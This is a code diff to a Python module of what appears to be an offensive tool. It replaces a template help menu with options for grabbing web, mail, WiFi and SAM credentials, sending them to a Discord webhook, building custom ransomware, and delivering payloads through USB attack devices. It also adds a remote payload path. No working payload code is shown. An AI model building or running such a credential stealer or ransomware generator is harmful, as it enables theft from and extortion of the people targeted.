@@ -1,20 +1,43 @@
 #!/usr/bin/python
 
-# created by : Fyzz
-# New Template
+# created by : C0SM0
+
+# TODO: list
+''' 
+- make powershell code into formatted docsrting
+'''
 
 # help menu for cipheringing process
+# TODO: arguments
+'''
+# payloads
+
+# renditions
+- hak5 tool incorporation?
+    - output to hak5
+- user interaciton [cpp v pwsh]
+'''
 help_menu = """
-+------------------------------------------------------+
-| [✓] ARGUMENTS Template                               |
-| [✓] ARG 2. Additional Aruments                       |
-|         [-t <plaintext>] --------- Input Text        |
-|         [-i <input file>] -------- Input File [.txt] |
-|         [-o <output file>] ------- Output File       |
-+------------------------------------------------------+
-| [✓] Example:                                         |
-|  cryptex template -e -t hello                        |
-+------------------------------------------------------+
++----------------------------------------------------------+
+| [✓] ARG 2. Additional Aruments                           |
+|         [-wh <webhook>] ------------ Discord Webhook     |
+|         [-wc] ---------------------- Web Credentials     |
+|         [-ml] ---------------------- Mail Credentials    |
+|         [-wf] ---------------------- WiFi Credentials    |
+|         [-rw] ---------------------- Custom Ransomware   |
+|         [-pe] ---------------------- Payload Encoder     |
+|         [-dl] ---------------------- DialUp Credentials  |
+|         [-sam] --------------------- SAM Grabber         |
+|         [-o <output-method>] ------- Output File         |
+|             <rd> ------------------- USB RubberDucky     |
+|             <bb> ------------------- Bash Bunny          |
+|             <omg> ------------------ O.MG Cable          |
+|             <exe> ------------------ Portable Executable |
+|             <ps1> ------------------ PowerShell Script   |
++----------------------------------------------------------+
+| [✓] Example:                                             |
+|  cryptex cp -wc -wh https://... -o ps1                   |
++----------------------------------------------------------+
 """
 
 # decode function [!] Each Cipher Must Have This <---------- [!]
@@ -73,3 +96,15 @@ def brute(args):
         # Pass False if Fail Message
         # Return Nothing to have no output
         return ['Custom Fail Message', False]
+
+'''
+//RESOURCES
+
+RAWPATH - https://raw.githubusercontent.com/AlexKollar/Cryptex/master/payloads
+
+function random-text {
+
+    return -join ((65..90) + (97..122) | Get-Random -Count 10 | ForEach-Object {[char]$_})
+
+}
+'''
